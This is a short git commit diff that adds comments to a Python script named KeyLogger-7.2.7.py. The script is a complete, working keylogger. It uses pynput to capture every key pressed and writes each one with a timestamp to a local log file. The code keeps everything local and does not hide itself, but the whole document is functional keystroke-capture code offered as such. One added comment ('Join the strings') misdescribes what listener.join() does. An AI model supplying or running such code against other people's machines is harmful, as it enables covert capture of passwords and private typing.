c82ea38beb8f4c33bf49adfd6a1ba8309c437c27
Kevin Jia <kevinhengkaijia@hotmail.com>
2017-10-22 17:14:32 +0100

    Update KeyLogger-7.2.7.py

--- KeyLogger-7.2.7.py
+++ KeyLogger-7.2.7.py
@@ -1,12 +1,22 @@
 from pynput.keyboard import Key, Listener
 import logging
 
+#Imported all the needed files
+
 log_dir = "logs/"
 
+#Set the directory to place the file that logs the keys pressed after this program begins to run
+
 logging.basicConfig(filename = (log_dir + "key_log.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')
+
+#Set the filename and format
 
 def on_press(key):
     logging.info(str(key))
     
+#Log the keys    
+    
 with Listener(on_press = on_press) as listener:
     listener.join()
+
+#Join the strings
